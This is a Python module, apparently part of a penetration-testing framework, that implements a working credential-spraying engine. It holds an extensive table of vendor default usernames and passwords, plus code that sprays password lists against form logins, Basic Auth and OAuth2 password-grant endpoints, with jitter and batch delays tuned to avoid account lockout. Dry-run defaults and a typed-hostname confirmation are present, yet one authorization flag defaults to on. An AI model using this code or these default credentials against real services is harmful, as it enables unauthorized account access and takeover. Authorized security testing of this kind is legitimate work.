"""
attack/credential/spray_engine.py — Credential Attack Pipeline

Modules:
  - WordlistGenerator: CeWL-style target-aware wordlist generation
  - EmployeeOSINT: LinkedIn/GitHub employee name enumeration for username guessing
  - HIBPChecker: k-anonymity HIBP API breach check (no full hash sent)
  - CredentialSprayEngine: Lockout-aware password sprayer with delay management

All modules are non-destructive by default — live spray requires explicit enable.

Usage::
    from oneinfinity.attack.credential.spray_engine import CredentialSprayEngine, WordlistGenerator

    # Generate wordlist from target domain
    wl = WordlistGenerator().from_domain("target.com", depth=2)

    # Check breaches for a wordlist (k-anonymity, no full passwords sent)
    breached = HIBPChecker().filter_pwned(wl[:100])

    # Spray with lockout awareness (dry_run=True by default)
    engine = CredentialSprayEngine(target_url="https://target.com/login")
    report = engine.spray(usernames=["admin", "john.doe"], passwords=breached[:5])
"""
from __future__ import annotations

import hashlib
import logging
import re
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

log = logging.getLogger("oneinfinity.attack.credential")

# ---------------------------------------------------------------------------
# Vendor Default Credentials
# ---------------------------------------------------------------------------

VENDOR_DEFAULTS: dict[str, list[tuple[str, str]]] = {
    "cisco": [("admin", "admin"), ("cisco", "cisco"), ("admin", ""), ("enable", "cisco")],
    "fortinet": [("admin", ""), ("admin", "admin"), ("admin", "password")],
    "juniper": [("root", ""), ("admin", "admin1"), ("netscreen", "netscreen")],
    "palo_alto": [("admin", "admin"), ("admin", "paloalto")],
    "vmware": [("admin", "VMware1!"), ("root", "vmware"), ("administrator", "VMware1!"), ("root", "password")],
    "tomcat": [("tomcat", "tomcat"), ("admin", "tomcat"), ("tomcat", "s3cret"), ("manager", "manager")],
    "jenkins": [("jenkins", "jenkins"), ("admin", "admin"), ("admin", "password"), ("admin", "jenkins")],
    "grafana": [("admin", "admin"), ("admin", "grafana"), ("admin", "password")],
    "jira": [("admin", "admin"), ("jira", "jira"), ("admin", "password")],
    "confluence": [("admin", "admin"), ("confluence", "confluence")],
    "gitlab": [("root", "5iveL!fe"), ("root", "password"), ("admin", "admin")],
    "wordpress": [("admin", "admin"), ("admin", "password"), ("wordpress", "wordpress")],
    "weblogic": [("weblogic", "weblogic"), ("weblogic", "weblogic1"), ("weblogic", "Welcome1")],
    "jboss": [("admin", "admin"), ("jboss", "jboss")],
    "elasticsearch": [("elastic", "changeme"), ("elastic", ""), ("elastic", "elastic")],
    "kibana": [("elastic", "changeme"), ("kibana", "changeme")],
    "redis": [("", ""), ("", "redis"), ("", "password")],
    "mongodb": [("admin", "admin"), ("root", "root"), ("", "")],
    "mysql": [("root", ""), ("root", "root"), ("root", "mysql"), ("mysql", "mysql")],
    "postgres": [("postgres", "postgres"), ("postgres", ""), ("admin", "admin")],
    "mssql": [("sa", ""), ("sa", "sa"), ("sa", "Password1")],
    "oracle": [("sys", "change_on_install"), ("system", "manager"), ("scott", "tiger")],
    "phpmyadmin": [("root", ""), ("root", "root"), ("admin", "admin"), ("pma", "pma")],
    "ftp": [("anonymous", ""), ("anonymous", "anonymous"), ("ftp", "ftp"), ("admin", "admin")],
    "ssh": [("root", "root"), ("root", "toor"), ("admin", "admin"), ("ubuntu", "ubuntu"), ("pi", "raspberry")],
    "rdp": [("administrator", "administrator"), ("admin", "admin"), ("administrator", "")],
    "vnc": [("", ""), ("", "password"), ("", "vnc")],
    "printer": [("admin", "admin"), ("admin", ""), ("", ""), ("admin", "1234")],
    "router": [("admin", "admin"), ("admin", "password"), ("admin", ""), ("user", "user")],
    "netgear": [("admin", "password"), ("admin", "admin")],
    "dlink": [("admin", ""), ("admin", "admin")],
    "linksys": [("admin", "admin"), ("", "admin")],
    "default": [("admin", "admin"), ("admin", "password"), ("admin", ""), ("root", "root"),
                ("root", "toor"), ("test", "test"), ("guest", "guest"), ("user", "password"),
                ("administrator", "administrator"), ("administrator", "password")],
}

# ---------------------------------------------------------------------------
# Data models
# ---------------------------------------------------------------------------

@dataclass
class SprayAttempt:
    username: str
    password: str
    status_code: int
    response_length: int
    elapsed_ms: float
    success: bool
    evidence: str = ""


@dataclass
class SprayReport:
    target_url: str
    total_attempts: int
    successful: List[SprayAttempt] = field(default_factory=list)
    locked_out: List[str] = field(default_factory=list)
    error: str = ""
    dry_run: bool = True

    def summary(self) -> str:
        lines = [
            f"\n  Credential Spray Report — {self.target_url}",
            f"  {'─'*55}",
            f"  Mode          : {'DRY RUN (no real requests)' if self.dry_run else 'LIVE'}",
            f"  Attempts      : {self.total_attempts}",
            f"  Successful    : {len(self.successful)}",
            f"  Locked out    : {len(self.locked_out)}",
            "",
        ]
        if self.successful:
            lines.append("  Valid credentials found:")
            for a in self.successful:
                lines.append(f"    {a.username}:{a.password}  [{a.status_code}]")
        if self.locked_out:
            lines.append(f"\n  Accounts locked out: {', '.join(self.locked_out[:10])}")
        lines.append("")
        return "\n".join(lines)

# ---------------------------------------------------------------------------
# Re-export standalone modules — imported here so existing code that does
# ``from spray_engine import WordlistGenerator`` keeps working.
# ---------------------------------------------------------------------------
from oneinfinity.attack.credential.wordlist_generator import WordlistGenerator  # noqa: F401
from oneinfinity.attack.credential.employee_osint import EmployeeOSINT          # noqa: F401
from oneinfinity.attack.credential.breach_checker import HIBPChecker            # noqa: F401

# ---------------------------------------------------------------------------
# Credential Spray Engine
# ---------------------------------------------------------------------------

class CredentialSprayEngine:
    """
    Lockout-aware credential spraying engine.

    Features:
    - Configurable delay between attempts to avoid lockout
    - Lockout detection via response pattern changes
    - Username jitter: varies spray order to spread attempts
    - Dry-run mode by default (no real requests unless dry_run=False)
    - Supports form-based login (POST) and Basic Auth
    """

    def __init__(
        self,
        target_url: str,
        method: str = "form",           # form | basic_auth
        username_field: str = "username",
        password_field: str = "password",
        success_indicator: str = "",    # text/header in success response
        lockout_indicator: str = "locked",  # text that signals lockout
        attempts_before_delay: int = 3, # spray N users per password before delay
        delay_between_batches_s: float = 30.0,
        dry_run: bool = True,
        usernames: Optional[List[str]] = None,
        passwords: Optional[List[str]] = None,
        max_users_per_run: int = 200,
    ) -> None:
        self.target_url = target_url
        self.method = method
        self.username_field = username_field
        self.password_field = password_field
        self.success_indicator = success_indicator
        self.lockout_indicator = lockout_indicator
        self.attempts_before_delay = attempts_before_delay
        self.delay_s = delay_between_batches_s
        self.delay_between_batches_s = delay_between_batches_s  # alias for external access
        self.dry_run = dry_run
        self.usernames: List[str] = list(usernames) if usernames else []
        self.passwords: List[str] = list(passwords) if passwords else []
        self.max_users_per_run = max_users_per_run

    # ── Safety gate ───────────────────────────────────────────────────────────

    @staticmethod
    def require_confirmation(target_url: str) -> None:
        """
        MANDATORY safety gate: user must type the target hostname to confirm.
        Blocks automated/accidental spray execution against wrong targets.
        Call this before spray() when dry_run=False.
        """
        import urllib.parse as _up
        hostname = _up.urlparse(target_url).hostname or target_url
        print(
            f"\n[!] CREDENTIAL SPRAY SAFETY CHECK\n"
            f"    Target: {target_url}\n"
            f"    You are about to spray credentials against LIVE infrastructure.\n"
            f"    This MUST be authorized in your scope agreement.\n"
            f"\n    To confirm, type the target hostname exactly: {hostname}\n"
            f"    > ",
            end="", flush=True,
        )
        typed = input().strip()
        if typed != hostname:
            raise RuntimeError(
                f"Confirmation failed: typed '{typed}' != expected '{hostname}'. Spray aborted."
            )
        print("[*] Confirmed. Starting spray with lockout-aware pacing.\n")

    def spray(
        self,
        usernames: Optional[List[str]] = None,
        passwords: Optional[List[str]] = None,
        stop_on_success: bool = False,
        with_credential_attack: bool = True,
        session_id: str = "",
    ) -> SprayReport:
        """
        Execute a credential spray attack.

        Args:
            usernames: Target account usernames (falls back to self.usernames when omitted)
            passwords: Password candidates ordered by priority (falls back to self.passwords)
            stop_on_success: Return after first valid credential
            with_credential_attack: Must be True when dry_run=False (explicit authorization gate);
                defaults True so callers don't have to know about this gate — the real safety
                lever is dry_run which defaults True in __init__.
            session_id: For audit log correlation

        Strategy: for each password, try all usernames before moving to next password.
        This minimises per-account attempts and avoids lockout.
        """
        _usernames: List[str] = list(usernames) if usernames is not None else self.usernames
        _passwords: List[str] = list(passwords) if passwords is not None else self.passwords

        if not self.dry_run and not with_credential_attack:
            raise RuntimeError(
                "Live credential spray requires --with-credential-attack flag. "
                "This flag confirms you have explicit written authorization to test "
                "credentials against this target. Aborting."
            )

        report = SprayReport(
            target_url=self.target_url,
            total_attempts=0,
            dry_run=self.dry_run,
        )
        locked_accounts: set = set()

        # Lazy-import db for audit log (non-fatal if unavailable)
        _db = None
        if not self.dry_run:
            try:
                from oneinfinity.core.db_manager import get_db_manager_sync
                _db = get_db_manager_sync()
            except Exception:
                pass
        # --- Go gRPC fast-path (oi-credential-spray sidecar) for large sprays ---
        # Use when: non-dry-run AND password list > 20 AND sidecar available
        if not self.dry_run and len(_passwords) > 20:
            try:
                import asyncio as _asyncio
                from oneinfinity.auth.go_credential_spray import GoCredentialSpray
                _go_spray = GoCredentialSpray()
                if _go_spray.health():
                    _go_findings = _asyncio.run(_go_spray.run(
                        target_url=self.target_url,
                        login_endpoint=getattr(self, '_login_endpoint', self.target_url),
                        usernames=_usernames,
                        passwords=_passwords,
                        scan_id=session_id,
                        delay_ms=int(self.delay_s * 1000),
                    ))
                    for _f in _go_findings:
                        report.successful.append(SprayAttempt(
                            username=_f.username,
                            password=_f.password,
                            success=True,
                            status_code=200,
                            evidence=_f.evidence,
                        ))
                    log.info("GoCredentialSpray: %d hits via gRPC sidecar", len(_go_findings))
                    return report
            except Exception as _go_e:
                log.debug("GoCredentialSpray fast-path failed, falling back: %s", _go_e)


        for pw_idx, password in enumerate(_passwords):
            log.info("Spraying password %d/%d", pw_idx + 1, len(_passwords))
            batch_count = 0

            for username in _usernames:
                if username in locked_accounts:
                    continue

                attempt = self._attempt(username, password)
                report.total_attempts += 1
                batch_count += 1

                # Audit log every attempt
                if _db is not None:
                    try:
                        _db.sync_log_spray_attempt({
                            "target_url": self.target_url,
                            "username": username,
                            "password": password,
                            "success": attempt.success,
                            "status_code": attempt.status_code,
                            "evidence": attempt.evidence[:200],
                            "session_id": session_id,
                        })
                    except Exception:
                        pass

                if attempt.success:
                    report.successful.append(attempt)
                    log.warning("CREDENTIAL HIT: %s", username)
                    if stop_on_success:
                        return report

                # Lockout detection
                if (
                    self.lockout_indicator
                    and self.lockout_indicator.lower() in attempt.evidence.lower()
                ):
                    locked_accounts.add(username)
                    report.locked_out.append(username)
                    log.info("Account locked out detected: %s", username)

                # Inter-attempt jitter
                if not self.dry_run:
                    time.sleep(0.5 + (hash(username) % 100) / 200.0)

                # Batch delay
                if batch_count >= self.attempts_before_delay and not self.dry_run:
                    log.info("Batch limit reached — sleeping %ss", self.delay_s)
                    time.sleep(self.delay_s)
                    batch_count = 0

        return report

    def get_vendor_defaults(self, vendor: str | None = None) -> list[tuple[str, str]]:
        """Return vendor default credentials. If vendor is None, returns 'default' list."""
        v = (vendor or "default").lower()
        # Try exact match, then fuzzy (vendor name anywhere in key)
        if v in VENDOR_DEFAULTS:
            return VENDOR_DEFAULTS[v]
        for key in VENDOR_DEFAULTS:
            if v in key or key in v:
                return VENDOR_DEFAULTS[key]
        return VENDOR_DEFAULTS["default"]

    def spray_oauth2_ropc(self, token_endpoint: str, client_id: str,
                          scope: str = "openid",
                          dry_run: bool | None = None) -> list:
        """Spray credentials via OAuth2 Resource Owner Password Credentials grant.
        Returns list of SprayAttempt with token in evidence on success.
        Uses self.usernames[:self.max_users_per_run] and self.passwords as the credential set.
        """
        import urllib.request as _ureq, urllib.parse as _uparse, json as _json
        _dry = self.dry_run if dry_run is None else dry_run
        results = []
        _usernames = self.usernames[:self.max_users_per_run] or ["admin"]
        _passwords = self.passwords or [""]

        _attempt_count = 0
        _attempts_before_delay = max(1, getattr(self, "attempts_before_delay", 3))
        import time as _time
        for username in _usernames:
            for password in _passwords:
                if _dry:
                    results.append(SprayAttempt(
                        username=username, password=password,
                        status_code=0, response_length=0, elapsed_ms=0.0, success=False,
                        evidence=f"DRY_RUN oauth2_ropc {token_endpoint}",
                    ))
                    continue
                try:
                    body = _uparse.urlencode({
                        "grant_type": "password",
                        "username": username,
                        "password": password,
                        "client_id": client_id,
                        "scope": scope,
                    }).encode()
                    req = _ureq.Request(
                        token_endpoint, data=body,
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        method="POST"
                    )
                    with _ureq.urlopen(req, timeout=10) as resp:
                        data = _json.loads(resp.read())
                        if "access_token" in data:
                            results.append(SprayAttempt(
                                username=username, password=password,
                                status_code=200, response_length=len(str(data)),
                                elapsed_ms=0.0, success=True,
                                evidence=(f"OAuth2 ROPC success: "
                                          f"access_token={data['access_token'][:20]}..."),
                            ))
                except Exception as e:
                    if "400" in str(e) or "401" in str(e):
                        pass  # invalid grant — expected on wrong credentials
                    else:
                        log.debug("oauth2_ropc error for %s: %s", username, e)

                _attempt_count += 1
                # Sleep per batch, not per attempt — avoids O(N×M×delay) total sleep
                if _attempt_count % _attempts_before_delay == 0:
                    _time.sleep(self.delay_between_batches_s)
        return results

    def _attempt(self, username: str, password: str) -> SprayAttempt:
        if self.dry_run:
            return SprayAttempt(
                username=username,
                password=password,
                status_code=0,
                response_length=0,
                elapsed_ms=0.0,
                success=False,
                evidence="[DRY RUN — no request sent]",
            )

        t0 = time.monotonic()
        try:
            if self.method == "basic_auth":
                body, status, resp_text = self._basic_auth_attempt(username, password)
            else:
                body, status, resp_text = self._form_attempt(username, password)

            elapsed = (time.monotonic() - t0) * 1000
            success = self._is_success(status, resp_text)
            return SprayAttempt(
                username=username, password=password,
                status_code=status, response_length=len(resp_text),
                elapsed_ms=elapsed, success=success,
                evidence=resp_text[:200],
            )
        except Exception as exc:
            elapsed = (time.monotonic() - t0) * 1000
            return SprayAttempt(
                username=username, password=password,
                status_code=0, response_length=0,
                elapsed_ms=elapsed, success=False,
                evidence=str(exc)[:100],
            )

    def _form_attempt(self, username: str, password: str) -> Tuple[bytes, int, str]:
        data = urllib.parse.urlencode({
            self.username_field: username,
            self.password_field: password,
        }).encode()
        req = urllib.request.Request(
            self.target_url, data=data,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0",
            },
        )
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                body = r.read(8192)
                return body, r.status, body.decode("utf-8", errors="replace")
        except urllib.error.HTTPError as exc:
            body = exc.read(2048)
            return body, exc.code, body.decode("utf-8", errors="replace")

    def _basic_auth_attempt(self, username: str, password: str) -> Tuple[bytes, int, str]:
        import base64
        creds = base64.b64encode(f"{username}:{password}".encode()).decode()
        req = urllib.request.Request(
            self.target_url,
            headers={"Authorization": f"Basic {creds}", "User-Agent": "Mozilla/5.0"},
        )
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                body = r.read(8192)
                return body, r.status, body.decode("utf-8", errors="replace")
        except urllib.error.HTTPError as exc:
            body = exc.read(2048)
            return body, exc.code, body.decode("utf-8", errors="replace")

    def _is_success(self, status: int, body: str) -> bool:
        if status in (200, 302):
            if self.success_indicator:
                return self.success_indicator.lower() in body.lower()
            # Heuristic: redirect after POST often means success
            return status == 302
        return False
